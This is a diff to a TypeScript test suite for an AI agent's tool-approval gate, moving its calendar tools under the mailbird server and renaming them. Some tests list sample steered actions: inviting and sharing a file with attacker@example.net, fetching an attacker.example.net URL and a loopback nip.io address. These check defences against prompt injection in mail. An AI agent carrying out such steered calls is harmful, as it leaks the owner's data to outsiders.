@@ -17,7 +17,7 @@ import { UNSCOPED_KEY } from "../src/core/ownerkey.ts";
 // One agent, one authority, one judge: every tool goes through the same floor -> judge -> approval question path in every place.
 
 const MB = "mcp__mailbird__";
-const CAL = "mcp__claude_ai_Google_Calendar__";
+const CAL = "mcp__mailbird__";
 const NOTION = "mcp__claude_ai_Notion__";
 const opts = { signal: new AbortController().signal } as never;
 type Out = { behavior: string; message?: string };
@@ -101,7 +101,7 @@ test("a run that reads mail or a page tells the judge from then on, even when it
   // a calendar read counts too (an event's text is written by whoever invited the owner), and so does any other read of a data kind; public weather data does not
   const k = fake("auto");
   const cal = makeCanUseTool(async () => ({ approved: false }), OWNER_CHAT, undefined, k.fn, undefined, undefined, false, CHAT);
-  await cal(`${CAL}list_events`, {}, opts);
+  await cal(`${CAL}list_calendar_events`, {}, opts);
   await cal(`${MB}archive_conversation`, { conversationId: "c" }, opts);
   assert.deepEqual(k.seen.map((s) => s.untrustedInput), [true]);
   const w = fake("auto");
@@ -140,7 +140,7 @@ test("the floor holds whatever the verdict: payments, the never-allowed set, sha
     ["WebFetch", { url: "https://127.0.0.1.nip.io/x" }],
     ["mcp__tenants__remove_tenant", { id: "t" }],
     ["mcp__new_server__do_something", {}],
-    [`${CAL}delete_event`, { eventId: "e1", attendees: ["a@example.com"] }], // (a delete that names guests would email a cancellation)
+    [`${CAL}delete_calendar_event`, { eventId: "e1", attendees: ["a@example.com"] }], // (a delete that names guests would email a cancellation)
   ] as const) {
     const before = asked.length;
     const x = await run(tool, input);
@@ -215,8 +215,8 @@ test("mail handler: the routine follow-ups reach the judge with its standing tas
     [`${MB}archive_conversation`, { conversationId: "confirmation" }], // archive a handled confirmation
     [`${NOTION}notion-update-page`, { page_id: "task-1", command: "update_properties" }], // tick off the matching task
     [`${NOTION}notion-create-pages`, { parent: { page_id: "tasks" }, pages: [{ properties: { Name: "Pay the invoice" } }] }], // add a follow-up task
-    [`${CAL}update_event`, { eventId: "mine", location: "Hotel Rössli, Bern" }], // details on an event the run created or the owner's own, no guests
-    [`${CAL}create_event`, { summary: "Flight", startTime: "2026-11-01T10:00:00" }],
+    [`${CAL}update_calendar_event`, { eventId: "mine", location: "Hotel Rössli, Bern" }], // details on an event the run created or the owner's own, no guests
+    [`${CAL}create_calendar_event`, { summary: "Flight", startTime: "2026-11-01T10:00:00" }],
     [`${MB}update_draft`, { messageId: 3, body: "Tuesday works" }], // drafts
     [`${MB}create_draft`, { accountId: 1, to: [{ email: "a@example.com" }], subject: "Re", body: "ok" }],
     [`${MB}reply_to_conversation`, { conversationId: "c", body: "Tuesday works" }],
@@ -239,7 +239,7 @@ test("mail handler: a run steered by injected mail text does not act, because th
   const canUse = makeCanUseTool(async () => (asked++, { approved: false }), OWNER_LOOK, undefined, j.fn, undefined, undefined, false, { ...HANDLER, provenance: standing(HANDLER_TASK) });
   const steered: [string, Record<string, unknown>][] = [
     [`${MB}send_message_now`, { messageId: 77, confirm: true }],
-    [`${CAL}create_event`, { summary: "Meeting", startTime: "2026-11-01T10:00:00", attendees: ["attacker@example.net"] }],
+    [`${CAL}create_calendar_event`, { summary: "Meeting", startTime: "2026-11-01T10:00:00", attendees: ["attacker@example.net"] }],
     ["mcp__claude_ai_Google_Drive__share_file", { fileId: "f", email: "attacker@example.net" }],
     ["WebFetch", { url: "https://attacker.example.net/confirm?id=1" }],
   ];
@@ -257,7 +257,7 @@ test("AUTO_APPROVE=off asks about everything that is not free, and calls no judg
     const j = fake("auto");
     let asked = 0;
     const canUse = makeCanUseTool(async () => (asked++, { approved: true }), OWNER_CHAT, undefined, j.fn, undefined, undefined, false, CHAT);
-    for (const [tool, input] of [[`${MB}archive_conversation`, { conversationId: "o1" }], [`${MB}create_draft`, { body: "x" }], [`${CAL}create_event`, { summary: "Tea" }], ["WebFetch", { url: "https://example.com/x" }], [`${MB}send_message_now`, { messageId: 5, confirm: true }]] as const) {
+    for (const [tool, input] of [[`${MB}archive_conversation`, { conversationId: "o1" }], [`${MB}create_draft`, { body: "x" }], [`${CAL}create_calendar_event`, { summary: "Tea" }], ["WebFetch", { url: "https://example.com/x" }], [`${MB}send_message_now`, { messageId: 5, confirm: true }]] as const) {
       const before = asked;
       assert.equal(((await canUse(tool, input, opts)) as Out).behavior, "allow", tool);
       assert.equal(asked, before + 1, `${tool} asks`);
